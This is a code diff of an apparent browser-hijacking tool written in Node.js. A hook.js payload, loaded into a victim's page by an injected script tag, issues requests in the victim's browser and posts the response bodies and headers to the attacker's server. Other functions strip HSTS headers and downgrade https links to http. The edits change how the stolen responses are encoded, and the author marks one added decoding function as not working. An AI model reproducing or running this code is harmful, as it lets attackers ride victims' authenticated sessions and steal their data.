@@ -18,6 +18,7 @@ const config = {
 const web = require(config.web_protocol);
 const proxy = require('http');
 const fs = require('fs');
+const qs = require('querystring');
 
 /* 
 task_pending structure:
@@ -41,28 +42,27 @@ proxy.createServer(function (req, res) {
         return;
     }
 
-    var url = new URL(req.url);
-    var path = url.pathname + "?" + url.searchString;
-
     console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
-    console.log("[+] Requesting: " + path)
-	
+    console.log("[+] Requesting: " + req.url)
+    var url = new URL(req.url).pathname;
+
     /* Check if request from proxy contains a body */
-    if (req.headers['content-length'] > 0 || req.headers['Content-Length'] > 0) {
+    if (req.headers['content-length'] > 0) {
         var body = '';
         req.on('data', function (chunk) {
             body += chunk;
         });
         req.on('end', function () {
             body_encoded = Buffer.from(body).toString('base64');
-            var new_task = {"id": task_counter++, "method": req.method, "url": path, "head": req.headers, "body": body_encoded}
+            var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": body_encoded}
             tasks_pending.push(new_task);
+            
             task_callbacks[new_task.id] = function (result) {
-                var body_decoded = Buffer.from(result.body, 'base64').toString();
+                var body_decoded = b64decode(result.body);
                 var body_fixed = stripHooks(body_decoded);
                 var body_fixed = https2http(body_fixed);
 
-                var headers_decoded = Buffer.from(result.headers, 'base64');
+                var headers_decoded = b64decode(result.headers);
                 var headers_fixed = str2json(headers_decoded);
                 var headers_fixed = stripHeaders(headers_fixed);
                 var headers_fixed = fixContentLength(headers_fixed, body_fixed.length);
@@ -77,14 +77,14 @@ proxy.createServer(function (req, res) {
             };
         });
 	} else {
-        var new_task = {"id": task_counter++, "method": req.method, "url": path, "head": req.headers, "body": null}
+        var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": null}
         tasks_pending.push(new_task);
         task_callbacks[new_task.id] = function (result) {
-            var body_decoded = Buffer.from(result.body, 'base64').toString();
+            var body_decoded = b64decode(result.body);
             var body_fixed = stripHooks(body_decoded);
             var body_fixed = https2http(body_fixed);
 
-            var headers_decoded = Buffer.from(result.headers, 'base64');
+            var headers_decoded = b64decode(result.headers);
             var headers_fixed = str2json(headers_decoded);
             var headers_fixed = stripHeaders(headers_fixed);
             var headers_fixed = fixContentLength(headers_fixed, body_fixed.length);
@@ -98,7 +98,6 @@ proxy.createServer(function (req, res) {
             res.end(body_fixed);
         };
     }
-
 
 }).listen(config.proxy_port, config.proxy_interface, function (err) {
     if (err) return console.error(err)
@@ -139,26 +138,14 @@ web.createServer(https_options, function (req, res) {
             res.writeHead(404)
             res.end();
         }
-    /* Catching the pre-flight request from the hooked browser */
-    } else if (req.url == '/responses' && req.method == 'OPTIONS') {
-        res.setHeader('Access-Control-Allow-Origin', '*')
-        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
-        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        res.writeHead(200);
-        res.end();
     /* Catching the responses */
     } else if (req.url == '/responses' && req.method == 'POST') {
-        res.setHeader('Access-Control-Allow-Origin', '*')
-        res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
-        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        res.setHeader('Content-Type', 'application/json')
-
         var body = '';
         req.on('data', function (chunk) {
             body += chunk;
         });
         req.on('end', function () {
-            var result = JSON.parse(body);
+            var result = qs.parse(body);
             var handler = task_callbacks[result.id];
             handler(result);
             res.writeHead(200);
@@ -175,13 +162,13 @@ web.createServer(https_options, function (req, res) {
     console.log(`[+] Web server is listening on address ${info.address} port ${info.port}`)
 });
 
-/* Converts each key in JSON to lower case */
-function convertJSONlower(_json) {
-    var asdf = _json;
-    asdf.replace(/"([^"]+)":/g, function($0,$1) {
-        return ('"' + $1.toLowerCase() + '":');
-    });
-    return asdf;
+/* https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/Base64_encoding_and_decoding#The_Unicode_Problem */
+/* Doesn't work */
+function b64decode(str) {
+    var decoded = Buffer.from(str, 'base64').toString('binary');
+    return decodeURIComponent(decoded.split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
 }
 
 /* Removes HSTS header */
@@ -194,7 +181,7 @@ function stripHeaders(headers) {
 
 /* Strips complete URLs with hook.js to "javascript", which will be ignored */
 function stripHooks(body) {
-    return body.replace(/https?:\/\/.*?\/hook\.js/g, 'javascript:');
+    return body.replace(/https?:\/\/.*?\/hook\.js/g, 'javascript:#');
 }
 
 /* Convert links in the body from https to http */
@@ -210,7 +197,7 @@ function fixContentLength(headers, new_length) {
 
 /* Convert raw headers to JSON with lowercase keys */
 function str2json(input) {
-    var input = input.toString().trim();
+    var input = input.trim();
     var x = input.split("\r\n");
     var buf = '{';
     for (var i = 0; i < x.length; i++) {
@@ -230,25 +217,30 @@ x.src='//${config.web_domain}:${config.web_port}/hook.js';document.head.appendCh
 console.log("[+] Payload:\r\n" + hook + "\r\n");
 
 var hook_file = `
+function b64encode(str) {
+    return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
+        function toSolidBytes(match, p1) {
+            return String.fromCharCode('0x' + p1);
+    }));
+}
 function makeRequest(id, method, url, head, body) {
     var target_http = new XMLHttpRequest();
     target_http.onreadystatechange = function() {       
         if (target_http.readyState == 4) {
             var mygg_http = new XMLHttpRequest();
             mygg_http.open("POST", "//${config.web_domain}:${config.web_port}/responses", true);
-            mygg_http.setRequestHeader("Content-Type", "application/json");
             var resp_status = target_http.status;
-            var resp_body = btoa(target_http.responseText);
-            var resp_headers = btoa(target_http.getAllResponseHeaders());
+            var resp_body = encodeURIComponent(b64encode(target_http.responseText));
+            var resp_headers = encodeURIComponent(b64encode(target_http.getAllResponseHeaders()));
             // Checking if the browser got a redirect
             if (url == getPath(target_http.responseURL)) {
-                var obj = {"id": id.toString(), "url": url, "status": resp_status, "headers": resp_headers, "body": resp_body}
+                var data = "id="+id.toString()+"&url="+url+"&status="+resp_status+"&headers="+resp_headers+"&body="+resp_body;
             } else {
                 // Need to redirect the attacking browser too
-                var redirect = btoa("Location: " + target_http.responseURL);
-                var obj = {"id": id.toString(), "url": url, "status": 301, "headers": redirect, "body": ''}
+                var redirect = b64encode("Location: " + target_http.responseURL);
+                var data = "id="+id.toString()+"&url="+url+"&status=301"+"&headers="+redirect+"&body="
             }
-            mygg_http.send(JSON.stringify(obj));
+            mygg_http.send(data);
         }
     };
     target_http.open(method, url, true);
